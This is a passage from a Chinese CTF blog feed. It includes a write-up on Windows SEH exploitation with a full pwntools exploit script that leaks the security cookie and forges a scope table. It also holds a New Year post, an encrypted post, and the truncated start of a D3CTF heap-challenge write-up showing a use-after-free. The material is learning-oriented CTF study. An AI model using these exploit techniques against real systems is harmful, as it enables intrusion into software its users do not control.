alt="image-20200207120606732"></p><p>这里通过v9输入，我们能控制seh在栈上的布局，从而劫持程序流程。</p><p>具体利用方式在于控制栈上seh的结构体。</p><p>我们首先来分析一下栈上的有哪些seh的值。</p><p><img src="5.png" alt="image-20200207122626305"></p><p>图中，1的值是返回地址，2是ebp，3是security_cookie^scopetable_address的值。在程序中存放security_cookie的位置是固定的，这位置是在data段，但是值不固定。</p><p><img src="6.png" alt="image-20200207122910795"></p><p>我们这里知道了main函数的地址，则我们可以通过泄露将security_cookie给泄露出来。</p><p>然后我们还要泄露Next的值，很多个异常处理块都是通过下图来连接在一块，这个Next的值是在栈上的，ebp-0x1c的地方，我们要修改scopetable_address，是一定会将这个地方覆盖的，但是我们程序会检查Next的值，所以我们要将这个地方泄露出来，然后原封不动的写回去。</p><p><img src="7.png" alt="img"></p><p>说到这里，给的链接上面也讲的挺详细的，我这里就讲讲这些文章我看的比较迷糊的地方</p><p>先研究一下其他博客的exp吧，毕竟我也是学着别人的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'192.168.80.133'</span>, <span class="number">1001</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_value</span><span class="params">(addr)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Do you want to know more?'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'yes'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Where do you want to know'</span>)</span><br><span class="line">    sh.sendline(str(addr))</span><br><span class="line">    sh.recvuntil(<span class="string">'value is '</span>)</span><br><span class="line">    <span class="keyword">return</span> int(sh.recvline(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'stack address ='</span>)</span><br><span class="line">result = sh.recvline()</span><br><span class="line">stack_addr = int(result, <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">'stack_addr: '</span> + hex(stack_addr))</span><br><span class="line">sh.recvuntil(<span class="string">'main address ='</span>)</span><br><span class="line">result = sh.recvline()</span><br><span class="line">main_address = int(result, <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">'main_address: '</span> + hex(main_address))</span><br><span class="line"></span><br><span class="line">security_cookie = get_value(main_address + <span class="number">12116</span>)</span><br><span class="line">log.success(<span class="string">'security_cookie: '</span> + hex(security_cookie))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">sh.sendline(<span class="string">'n'</span>)</span><br><span class="line">next_addr = stack_addr + <span class="number">212</span></span><br><span class="line">log.success(<span class="string">'next_addr: '</span> + hex(next_addr))</span><br><span class="line"><span class="comment">#这上面的都是在泄露，没啥好看的</span></span><br><span class="line">SCOPETABLE = [</span><br><span class="line">    <span class="number">0x0FFFFFFFE</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x0FFFFFFCC</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0xFFFFFFFE</span>,</span><br><span class="line">    main_address + <span class="number">733</span>,</span><br><span class="line">]</span><br><span class="line"><span class="comment">#这上面就是我们要伪造的SCOPETABLE</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">16</span> + flat(SCOPETABLE).ljust(<span class="number">104</span> - <span class="number">16</span>, <span class="string">'a'</span>) + p32((stack_addr + <span class="number">156</span>) ^ security_cookie) + <span class="string">'c'</span> * <span class="number">32</span> + p32(next_addr) + p32(main_address + <span class="number">944</span>) + p32((stack_addr + <span class="number">16</span>) ^ security_cookie) + p32(<span class="number">0</span>) + <span class="string">'b'</span> * <span class="number">16</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recvline()</span><br><span class="line">sh.sendline(<span class="string">'yes'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Where do you want to know'</span>)</span><br><span class="line">sh.sendline(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>其实这个exp大部分很好懂，当时我卡了很久的地方就是payload的构造部分，相信你们也看到了，不同文章的payload不同。我们先对比两个不一样的payload吧。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里称为payload1</span></span><br><span class="line">SCOPETABLE = [</span><br><span class="line">    <span class="number">0x0FFFFFFFE</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x0FFFFFFCC</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0xFFFFFFFE</span>,</span><br><span class="line">    main_address + <span class="number">733</span>,</span><br><span class="line">]</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">16</span> + flat(SCOPETABLE).ljust(<span class="number">104</span> - <span class="number">16</span>, <span class="string">'a'</span>) + p32((stack_addr + <span class="number">156</span>) ^ security_cookie) + <span class="string">'c'</span> * <span class="number">32</span> + p32(next_addr) + p32(main_address + <span class="number">944</span>) + p32((stack_addr + <span class="number">16</span>) ^ security_cookie) + p32(<span class="number">0</span>) + <span class="string">'b'</span> * <span class="number">16</span></span><br><span class="line">sh.sendline(payload)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里称为payload2</span></span><br><span class="line">SEH_scope_table = p32(<span class="number">0x0FFFFFFE4</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0xFFFFFF20</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0xFFFFFFFE</span>)</span><br><span class="line">SEH_scope_table += p32(shell_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">4</span>+SEH_scope_table.ljust(<span class="number">0x80</span><span class="number">-4</span>,<span class="string">"x22"</span>)+p32(ebp^___security_cookie_value)+<span class="string">"b"</span>*<span class="number">8</span>+p32(Next_value)+p32(main_addr + <span class="number">944</span>)+p32((stack_addr+<span class="number">4</span>)^___security_cookie_value)+p32(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>对比发现两个payload大同小异，区别是ebp^security_cookie的地方不一样。起初我以为没有关系，但是我乱放之后直接导致程序崩溃。</p><p>然后我仔细分析了一下，这个ebp^security_cookie存放的地方和伪造的SCOPETABLE有关系。</p><p>当我们触发异常后，程序会调用se的处理程序，也就是ebp-0x10的地方所指向的地方，这里是不能劫持的，劫持后程序会崩溃，不信可以试试。然后我们到ebp-0x10的这个地方</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:00401460                 push    ebp</span><br><span class="line">.text:00401461                 mov     ebp, esp</span><br><span class="line">.text:00401463                 push    [ebp+arg_C]</span><br><span class="line">.text:00401466                 push    [ebp+arg_8]</span><br><span class="line">.text:00401469                 push    [ebp+arg_4]</span><br><span class="line">.text:0040146C                 push    [ebp+arg_0]</span><br><span class="line">.text:0040146F                 push    offset @__security_check_cookie@4 ; __security_check_cookie(x)</span><br><span class="line">.text:00401474                 push    offset ___security_cookie</span><br><span class="line">.text:00401479                 call    _except_handler4_common</span><br><span class="line">.text:0040147E                 add     esp, 18h</span><br><span class="line">.text:00401481                 pop     ebp</span><br><span class="line">.text:00401482                 retn</span><br></pre></td></tr></table></figure><p>这个地方调用了_except_handler4_common</p><p>分析一下_except_handler4_common</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl _except_handler4_common(<span class="keyword">unsigned</span> <span class="keyword">int</span> *securityCookies, <span class="keyword">void</span> (__fastcall *cookieCheckFunction)(<span class="keyword">unsigned</span> <span class="keyword">int</span>), _EXCEPTION_RECORD *exceptionRecord, <span class="keyword">unsigned</span> __int32 sehFrame, _CONTEXT *context)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 异或解密 scope table</span></span><br><span class="line">    scopeTable_1 = (_EH4_SCOPETABLE *)(*securityCookies ^ *(_DWORD *)(sehFrame + <span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sehFrame 等于 上图 ebp - 10h 位置, framePointer 等于上图 ebp 的位置</span></span><br><span class="line">    framePointer = (<span class="keyword">char</span> *)(sehFrame + <span class="number">16</span>);</span><br><span class="line">    scopeTable = scopeTable_1;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 验证 GS</span></span><br><span class="line">    ValidateLocalCookies(cookieCheckFunction, scopeTable_1, (<span class="keyword">char</span> *)(sehFrame + <span class="number">16</span>));</span><br><span class="line">    __except_validate_context_record(context);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( exceptionRecord-&gt;ExceptionFlags &amp; <span class="number">0x66</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        exceptionPointers.ExceptionRecord = exceptionRecord;</span><br><span class="line">        exceptionPointers.ContextRecord = context;</span><br><span class="line">        tryLevel = *(_DWORD *)(sehFrame + <span class="number">12</span>);</span><br><span class="line">        *(_DWORD *)(sehFrame - <span class="number">4</span>) = &amp;exceptionPointers;</span><br><span class="line">        <span class="keyword">if</span> ( tryLevel != <span class="number">-2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                v8 = tryLevel + <span class="number">2</span> * (tryLevel + <span class="number">2</span>);</span><br><span class="line">                filterFunc = (<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD))*(&amp;scopeTable_1-&gt;GSCookieXOROffset + v8);</span><br><span class="line">                scopeTableRecord = (_EH4_SCOPETABLE_RECORD *)((<span class="keyword">char</span> *)scopeTable_1 + <span class="number">4</span> * v8);</span><br><span class="line">                encloseingLevel = scopeTableRecord-&gt;EnclosingLevel;</span><br><span class="line">                scopeTableRecord_1 = scopeTableRecord;</span><br><span class="line">                <span class="keyword">if</span> ( filterFunc )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 调用 FilterFunc</span></span><br><span class="line">                    filterFuncRet = _EH4_CallFilterFunc(filterFunc);</span><br><span class="line">                    ......</span><br><span class="line">                    <span class="keyword">if</span> ( filterFuncRet &gt; <span class="number">0</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                        ......</span><br><span class="line">                        <span class="comment">// 调用 HandlerFunc</span></span><br><span class="line">                        _EH4_TransferToHandler(scopeTableRecord_1-&gt;HandlerFunc, v5 + <span class="number">16</span>);</span><br><span class="line">                        ......</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                ......</span><br><span class="line">                tryLevel = encloseingLevel;</span><br><span class="line">                <span class="keyword">if</span> ( encloseingLevel == <span class="number">-2</span> )</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                scopeTable_1 = scopeTable;</span><br><span class="line">            &#125;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们重点关注的是那个验证GS的函数，将取出来的scopeTable,当作参数传入了ValidateLocalCookies，然后将ebp传入ValidateLocalCookies。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">void __cdecl ValidateLocalCookies(void (__fastcall *cookieCheckFunction)(unsigned int), _EH4_SCOPETABLE *scopeTable, char *framePointer)</span><br><span class="line">&#123;</span><br><span class="line">    unsigned int v3; // esi@2</span><br><span class="line">    unsigned int v4; // esi@3</span><br><span class="line"></span><br><span class="line">    if ( scopeTable-&gt;GSCookieOffset != -2 )</span><br><span class="line">    &#123;</span><br><span class="line">        v3 = *(_DWORD *)&amp;framePointer[scopeTable-&gt;GSCookieOffset] ^ (unsigned int)&amp;framePointer[scopeTable-&gt;GSCookieXOROffset];</span><br><span class="line">        __guard_check_icall_fptr(cookieCheckFunction);</span><br><span class="line">        ((void (__thiscall *)(_DWORD))cookieCheckFunction)(v3);</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = *(_DWORD *)&amp;framePointer[scopeTable-&gt;EHCookieOffset] ^ (unsigned int)&amp;framePointer[scopeTable-&gt;EHCookieXOROffset];</span><br><span class="line">    __guard_check_icall_fptr(cookieCheckFunction);</span><br><span class="line">    ((void (__thiscall *)(_DWORD))cookieCheckFunction)(v4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个代码首先会判断scopeTable-&gt;GSCookieOffset 也就是scopeTable的第一个值是不是0x0FFFFFFFE，如果是着会去取scopeTable-&gt;EHCookieOffset的值作为偏移，然后ebp为数组地址，取出数组的值。然后再取出scopeTable-&gt;EHCookieXOROffset为索引的值异或。然后判断结果是不是security_cookie。同理，如果不是，则会使用scopeTable-&gt;GSCookieOffset和scopeTable-&gt;GSCookieXOROffset为索引的值异或，最后判断结果是不是security_cookie。</p><p>这里我们就很好伪造了，通常我们会让GSCookieXOROffset和EHCookieOffset为0。然后这个时候数组的值就是ebp了，然后我们伪造gs为，ebp^security就可以了。然后这个值在哪就通过先判断scopeTable-&gt;GSCookieOffset是不是-2,如果是-2,则存放的地方就是scopeTable-&gt;GSCookieOffset来决定的。如果不是-2，则是EHCookieOffset来决定。</p><p>说到这里，结构体就已经伪造完毕，用第一个payload或者第二个payload都可以，因为他们使用的方式不同。</p><p>伪造的结构体存放在哪里都可以，但是要确保，ebp-0x8的地方存放的是伪造的结构体的地址异或security_cookie的值。像payload1和payload2都是存放再栈上。</p><p>到这里所以我个人觉得含糊的地方都讲清楚了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;武汉加油！湖北加油！&lt;/p&gt;
&lt;p&gt;被疫情隔离在家，很久之前就学会了，但是一直没有时间写，现在终于有时间写一写了。&lt;/p&gt;
&lt;p&gt;这个利用其实和linux下的利用差别还是很大的，要控制好几个结构体，要利用到SEH链。&lt;/p&gt;
&lt;p&gt;先给大家推荐两篇文章吧，我就是照着这两篇文
      
    
    </summary>
    
    
      <category term="pwn学习" scheme="http://Whali3n51.top/categories/pwn%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="win_pwn" scheme="http://Whali3n51.top/tags/win-pwn/"/>
    
  </entry>
  
  <entry>
    <title>新年快乐</title>
    <link href="http://whali3n51.top/2020/01/01/happy-new-year/"/>
    <id>http://whali3n51.top/2020/01/01/happy-new-year/</id>
    <published>2019-12-31T16:00:00.000Z</published>
    <updated>2020-02-08T14:22:56.929Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="祝大家新的一年心想事成">祝大家新的一年心想事成</span></h1><p>2019年过去了，2019发生了许多许多的事，每件事都让我挺难忘了。2019年大概是我这二十年以来过的最精彩的一年了。2019年也时我技术突飞猛涨的一年。想想去年这个时候，我还啥也不会，到了今年，却已经去各个地方比赛。在新的一年里，祝大家技术突飞猛进，心想事成，烦恼走开，赶快脱单。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;&lt;span id=&quot;祝大家新的一年心想事成&quot;&gt;祝大家新的一年心想事成&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;2019年过去了，2019发生了许多许多的事，每件事都让我挺难忘了。2019年大概是我这二十年以来过的最精彩的一年了。2019年也时我技术突飞猛涨的一年。想想去年这个时候，我
      
    
    </summary>
    
    
      <category term="其他" scheme="http://Whali3n51.top/categories/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="新年快乐" scheme="http://Whali3n51.top/tags/%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90/"/>
    
  </entry>
  
  <entry>
    <title>浅尝多线程pwn</title>
    <link href="http://whali3n51.top/2019/12/11/%E6%B5%85%E5%B0%9D%E5%A4%9A%E7%BA%BF%E7%A8%8Bpwn/"/>
    <id>http://whali3n51.top/2019/12/11/%E6%B5%85%E5%B0%9D%E5%A4%9A%E7%BA%BF%E7%A8%8Bpwn/</id>
    <published>2019-12-11T13:48:20.000Z</published>
    <updated>2020-02-08T14:22:28.949Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章。</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="b5f6f3f49f00594822848e0b76c7499109b5c8bdb953da7f5ffe815d3c6c2389">7f854dae60f2b3cbfe1054663f1fc2f0fd5c07831dfe5fcb9658b878fdf977a3a63352efe928c0bfea970d322d70cdfad6f5185b0a40975bb6defc70015bdaf31f01cbd0df57d8d10b6773fca330d71a53ab58582e830adcb71d9332ef878cf47af961f0c21de81ddbd94c538dc66edcea247cdef87f124652ef7cd2bb29105989a50dfd9b258cf0330880065c78da1ba5b390d33e5a7db8554be543ce2356d235859f84b7e36d9cc1cc547871072382efcd3a338c21c68c47c9f66e3aea28c0498c4c989f730fabb195921bffb9fe985412169d68e1a10db894cdde895d5ec9f797c31068141875fcaf214012c2b44bd854cd33637ce90070faac02459e36ca8ba82d9b5939e12ce987f382ad998f7735b991a0d6f86015b0389383e96e75cfe87edbda8258f1dcfb1d6a4060a618a11b7e60e24c90247e14f0b423815a73c10bbfa1133c44178b79e02b4fdde87ec15ff29ada93cd21655773686b1133371ae9b3447a2824213e53aa9f29675bf10f</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      这是一篇加密文章，内容可能是个人情感宣泄或者收费技术。如果你确实想看，请与我联系。
    
    </summary>
    
    
      <category term="pwn学习" scheme="http://Whali3n51.top/categories/pwn%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="多线程pwn" scheme="http://Whali3n51.top/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8Bpwn/"/>
    
  </entry>
  
  <entry>
    <title>D3CTF_new_heap复现</title>
    <link href="http://whali3n51.top/2019/12/10/D3CTF-new-heap%E5%A4%8D%E7%8E%B0/"/>
    <id>http://whali3n51.top/2019/12/10/D3CTF-new-heap%E5%A4%8D%E7%8E%B0/</id>
    <published>2019-12-10T07:27:11.000Z</published>
    <updated>2020-02-08T14:21:26.604Z</updated>
    
    <content type="html"><![CDATA[<p>D3CTF那天去打红帽杯了，但是D3CTF 结束后，和其他师傅交流了一下，这道题不错 。而且这道题考点很清奇。</p><p>首先我们来看一下这一题开启的保护和使用的libc版本</p><p>题目附件:<a href="./new_heap_update.zip">new_heap_update.zip</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whalien51@ubuntu:~/new_heap-updated$ strings libc.so.6 |grep GLIBC</span><br><span class="line">GLIBC_2.29</span><br></pre></td></tr></table></figure><p>这一题使用的libc2.29。</p><p>直接IDA源码分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_C33</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *ptr; <span class="comment">// ST08_8</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">  ptr = <span class="built_in">malloc</span>(<span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"good present for African friends:0x%x\n"</span>, ((ptr &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span>));</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里发现没有setbuf(stdin,0)。意思是这里会为getchar()输入开辟一个很大的堆块形成缓冲区。</p><p>然后再读源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  sub_C33();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_C08();</span><br><span class="line">      v3 = sub_BB9();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      sub_B42();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"sure?"</span>);</span><br><span class="line">      <span class="keyword">if</span> ( getchar() == <span class="string">'y'</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_A60();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现getchar()那里可以一直往缓冲区输入数值。</p><p>这个是漏洞之一</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_B42</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"index:"</span>);</span><br><span class="line">  v1 = sub_BB9();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">17</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"index out of range"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(qword_202060[v1]);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"done"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里存在uaf，第二个漏洞。</p><p>然后看创建堆块函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_A60</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">size_t</span> <span class="built_in">size</span>; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; qword_202060[i]; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i == <span class="number">17</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"full"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"size:"</span>);</span><br><span class="line">  result = sub_BB9();</span><br><span class="line">  LODWORD(<span class="built_in">size</span>) = result;</span><br><span class="line">  <span class="keyword">if</span> ( result &lt;= <span 